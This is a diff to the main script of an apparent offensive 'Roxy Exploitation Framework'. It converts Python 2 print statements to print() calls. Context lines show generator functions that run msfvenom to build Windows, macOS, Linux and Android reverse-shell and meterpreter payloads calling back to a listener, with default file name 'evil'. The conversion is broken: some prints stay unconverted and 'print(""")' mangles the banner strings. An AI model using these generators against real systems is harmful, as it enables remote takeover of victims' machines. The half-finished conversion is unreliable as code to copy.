@@ -69,32 +69,32 @@ CHECK_CORE = os.path.exists(CORE)
 CHECK_PLUGINS = os.path.exists(PLUGINS)
 
 if CHECK_PLUGINS == False:
-    print "Missing files..."
+    print("Missing files...")
     sys.exit()
 else:
     var = "1"
 
 if CHECK_CORE == False:
-    print "Missing files..."
+    print("Missing files...")
     sys.exit()
 else:
     var = "1"
 
 if CHECK_MODULES == False:
-    print "Missing files..."
+    print("Missing files...")
     sys.exit()
 else:
     var = "1"
 
 if CHECK_STORAGE == False:
-    print "Missing files..."
+    print("Missing files...")
     sys.exit()
 else:
     var = "1"
 
 os.system('clear')
 time.sleep(0.1)
-print "\033[1;94m[?]\033[1;m Starting Roxy Exploitation Framework..."
+print("\033[1;94m[?]\033[1;m Starting Roxy Exploitation Framework...")
 time.sleep(20)
 RescoursesDir = os.getcwd()
 
@@ -105,13 +105,13 @@ logfile = "%s/storage/logs/%s.log" % (RescoursesDir,dandtime)
 if CHECK_LOGS == True:
     filename_logging = os.path.join(os.path.dirname(__file__), logfile)
     logging.basicConfig(filename=filename_logging, filemode='w', level=logging.DEBUG)
-    print "\033[1;94m[?]\033[1;m Creating logfile:", logfile
+    print("\033[1;94m[?]\033[1;m Creating logfile:", logfile)
 else:
-    print "\033[1;31m[?]\033[1;m Failed Creating logfile:", logfile
+    print("\033[1;31m[?]\033[1;m Failed Creating logfile:", logfile)
 
 time.sleep(1)
 os.system('clear')
-print """
+print(""")
 %s
        =[ \033[1;33mRoxy Exploitation Framework %s\033[1;97m     ]
 + -- --=[ Loaded plugins - %s                   ]
@@ -133,7 +133,7 @@ def main():
                 #example()
                 #main()
         if terminal[0:6] == 'search':
-            print "\033[1;94m[?]\033[1;m Searching %s" % (terminal[7:])
+            print("\033[1;94m[?]\033[1;m Searching %s" % (terminal[7:]))
             time.sleep(1)
             names = addrs
             found = []
@@ -202,15 +202,15 @@ def main():
             os.system(terminal[0:])
             main()
         else:
-            print "Command not found:", terminal
+            print("Command not found:", terminal)
             main()
     except(KeyboardInterrupt):
-        print "\n"
+        print("\n")
         return main()
 
 
 def showlist():
-	print """
+	print(""")
 Plugin Category
 ===============
 
@@ -236,11 +236,11 @@ def exe_gen():
     iper = "192.168.1.8"
     porter = "5384"
     namer = "evil"
-    print "\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on"
+    print("\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on")
     ip = raw_input('\033[1;92m[+]\033[1;m ip: [' + iper + ']: ') or iper
     print "\033[1;94m[?]\033[1;m Port :: Your port you want to listen on"
     port = raw_input('\033[1;92m[+]\033[1;m port: [' + porter + ']: ') or porter
-    print "\033[1;94m[?]\033[1;m Filename :: Filename to export as"
+    print("\033[1;94m[?]\033[1;m Filename :: Filename to export as")
     name = raw_input('\033[1;92m[+]\033[1;m filename: [' + namer + ']: ') or namer
     os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -f exe > output/' + name + '.exe')
     print "Done... saved as " + RescoursesDir + "/" + name + ".exe"
@@ -249,11 +249,11 @@ def macho_gen():
     iper = "192.168.1.8"
     porter = "5384"
     namer = "evil"
-    print "\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on"
+    print("\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on")
     ip = raw_input('\033[1;92m[+]\033[1;m ip: [' + iper + ']: ') or iper
-    print "\033[1;94m[?]\033[1;m Port :: Your port you want to listen on"
+    print("\033[1;94m[?]\033[1;m Port :: Your port you want to listen on")
     port = raw_input('\033[1;92m[+]\033[1;m port: [' + porter + ']: ') or porter
-    print "\033[1;94m[?]\033[1;m Filename :: Filename to export as"
+    print("\033[1;94m[?]\033[1;m Filename :: Filename to export as")
     name = raw_input('\033[1;92m[+]\033[1;m filename: [' + namer + ']: ') or namer
     os.system('msfvenom -p osx/x86/shell_reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -f macho > output/' + name + '.macho')
     print "Done... saved as " + RescoursesDir + "/" + name + ".macho"
@@ -262,27 +262,27 @@ def elf_gen():
     iper = "192.168.1.8"
     porter = "5384"
     namer = "evil"
-    print "\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on"
+    print("\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on")
     ip = raw_input('\033[1;92m[+]\033[1;m ip: [' + iper + ']: ') or iper
-    print "\033[1;94m[?]\033[1;m Port :: Your port you want to listen on"
+    print("\033[1;94m[?]\033[1;m Port :: Your port you want to listen on")
     port = raw_input('\033[1;92m[+]\033[1;m port: [' + porter + ']: ') or porter
-    print "\033[1;94m[?]\033[1;m Filename :: Filename to export as"
+    print("\033[1;94m[?]\033[1;m Filename :: Filename to export as")
     name = raw_input('\033[1;92m[+]\033[1;m filename: [' + namer + ']: ') or namer
     os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' -f elf > output/' + name + '.elf')
-    print "Done... saved as " + RescoursesDir + "/" + name + ".elf"
+    print("Done... saved as " + RescoursesDir + "/" + name + ".elf")
 
 def apk_gen():
     iper = "192.168.1.8"
     porter = "5384"
     namer = "evil"
-    print "\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on"
+    print("\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on")
     ip = raw_input('\033[1;92m[+]\033[1;m ip: [' + iper + ']: ') or iper
-    print "\033[1;94m[?]\033[1;m Port :: Your port you want to listen on"
+    print("\033[1;94m[?]\033[1;m Port :: Your port you want to listen on")
     port = raw_input('\033[1;92m[+]\033[1;m port: [' + porter + ']: ') or porter
-    print "\033[1;94m[?]\033[1;m Filename :: Filename to export as"
+    print("\033[1;94m[?]\033[1;m Filename :: Filename to export as")
     name = raw_input('\033[1;92m[+]\033[1;m filename: [' + namer + ']: ') or namer
     os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + port + ' R > output/' + name + '.apk')
-    print "Done... saved as " + RescoursesDir + "/" + name + ".apk"
+    print("Done... saved as " + RescoursesDir + "/" + name + ".apk")
 
 def start():
     menu.main_info()
